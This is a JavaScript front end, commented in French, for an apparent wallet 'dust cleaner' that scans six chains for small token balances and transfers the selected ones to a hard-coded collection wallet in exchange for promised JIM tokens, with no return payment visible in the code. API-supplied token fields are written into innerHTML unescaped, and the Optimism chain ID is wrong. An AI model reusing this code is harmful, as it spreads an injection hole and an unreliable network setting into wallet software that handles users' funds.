const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

// CORRIGÉ : Remplacement de l'espace par un underscore (_)
const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

// Configuration des IDs techniques des réseaux pour MetaMask
const CHAIN_IDS = {
    "eth": "0x1",
    "base": "0x2105",
    "polygon": "0x89",
    "bsc": "0x38",
    "arbitrum": "0xa4b1",
    "optimism": "0xa4b0"
};

const NETWORKS = ["base", "eth", "polygon", "bsc", "arbitrum", "optimism"];

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

async function scanDust(wallet) {
    dustContainer.innerHTML = "🔍 Scan des poussières sur toutes les chaînes...";
    let allTokens = [];

    for (const chain of NETWORKS) {
        try {
            const response = await fetch(
                `https://jimtok-backend.onrender.com/tokens/${wallet}/${chain}`
            );
            const tokens = await response.json();

            // Vérification que l'API renvoie bien un tableau valide
            if (tokens && Array.isArray(tokens)) {
                tokens.forEach(token => {
                    const balance = Number(token.balance_formatted);
                    const usd = Number(token.usd_value || 0);

                    if (
                        balance > 0 &&
                        usd < 10 &&
                        token.possible_spam !== true
                    ) {
                        allTokens.push({
                            ...token,
                            chain: chain // On garde en mémoire de quelle blockchain vient ce jeton
                        });
                    }
                });
            }
        } catch(err) {
            console.log("Erreur lors du scan de la chaîne " + chain + ":", err);
        }
    }

    renderTokens(allTokens);
}

function renderTokens(tokens) {
    dustContainer.innerHTML = "";

    if (tokens.length === 0) {
        dustContainer.innerHTML = "Aucune poussière détectée.";
        return;
    }

    tokens.forEach(token => {
        const div = document.createElement("div");
        div.className = "token";
        // Ajout du nom de la blockchain à côté du symbole pour que l'utilisateur comprenne
        div.innerHTML = `
            <input type="checkbox" />
            <strong>${token.symbol}</strong> <span style="font-size:10px; color:gray;">(${token.chain.toUpperCase()})</span>
            <div class="small">
                ${token.balance_formatted}
                ≈ $${Number(token.usd_value || 0).toFixed(2)}
            </div>
        `;

        const checkbox = div.querySelector("input");

        checkbox.addEventListener("change", e => {
            if (e.target.checked) {
                selectedTokens.push(token);
            } else {
                selectedTokens = selectedTokens.filter(
                    t => !(t.token_address === token.token_address && t.chain === token.chain)
                );
            }
            updateButton();
        });

        dustContainer.appendChild(div);
    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }

    cleanButton.style.display = "block";

    let total = selectedTokens.reduce(
        (sum, t) => sum + Number(t.usd_value || 0),
        0
    );

    const estimatedJIM = Math.floor(total * 1000);
    cleanButton.innerText = `Recevoir ~ ${estimatedJIM} JIM`;
}

// CORRIGÉ : Ajout du changement de réseau automatisé pour éviter les crashs de transactions cross-chain
cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            const targetChainId = CHAIN_IDS[token.chain];
            
            statusDiv.innerHTML = `⏳ Basculement vers le réseau ${token.chain.toUpperCase()}...`;
            
            // On force MetaMask à changer de blockchain pour correspondre au jeton sélectionné
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetChainId }],
                });
            } catch (switchError) {
                // Si le réseau n'est pas configuré dans son MetaMask, on l'arrête proprement
                alert(`S'il te plaît, ajoute ou sélectionne le réseau ${token.chain.toUpperCase()} dans ton MetaMask.`);
                throw new Error("Réseau non disponible");
            }

            // On recrée proprement le provider et le signer après le changement de réseau
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();

            const tokenContract = new ethers.Contract(
                token.token_address,
                [
                    "function transfer(address to, uint256 amount) returns (bool)"
                ],
                signer
            );

            statusDiv.innerHTML = `⏳ Autorisation et transfert de ${token.symbol}...`;

            // Envoi sécurisé du montant avec BigInt
            const tx = await tokenContract.transfer(
                COLLECTION_WALLET,
                BigInt(token.balance.toString())
            );

            await tx.wait();
        }

        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été envoyées !";
        selectedTokens = [];
        updateButton();
        // Optionnel : Relancer un scan pour rafraîchir la liste
        const currentAddress = await signer.getAddress();
        scanDust(currentAddress);

    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Transaction annulée ou erreur réseau";
    }
};
